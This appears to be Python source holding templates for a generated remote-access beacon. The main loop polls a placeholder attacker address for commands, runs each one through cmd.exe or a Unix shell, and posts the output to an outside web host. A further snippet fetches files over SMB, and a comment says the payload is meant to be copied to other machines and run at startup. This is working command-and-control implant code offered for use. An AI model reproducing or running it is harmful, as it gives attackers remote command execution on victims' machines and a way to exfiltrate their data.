# This is the base for executing Windows commands
WINCMDEXEC = '''
def GENERATEFUNC1(beacon_command):
    import subprocess
    command = ['cmd.exe', '/C', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out
'''

# This is the base for constructing our beacon
BASE = '''
while 1:
    import requests
    import time
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (platform; rv:58) Gecko/geckotrail Firefox/90'
        # Set our UA to firefox
    }
    
    a = requests.get('REPLACEIP:REPLACEPORT', headers=headers)
    cmd = a.text
    op = cmd.split(';')[0]
    cm = cmd.split(';')[1]
    ex = cmd.split(';')[2]
    enc = cmd.split(';')[3]

    if op == 'cmd':
        returned = GENERATEFUNC1(cm)
        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
        print(response.request.url)
        print(response.request.body)
        print(response.request.headers)

    time.sleep(REPLACESLEEPINT)

'''

# Base for executing Nix commands
NIXCMDEXEC = '''
def GENERATEFUNC1(beacon_command):
    import subprocess
    command = [beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out
'''

# The intention here is that you would copy this to another machine to execute on startup
WINREMOTECOPY = '''
def GENERATEFUNC2(full_path):
    import urllib
    from smb.SMBHandler import SMBHandler
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open(full_path)
    data = fh.read()
    fh.close()

'''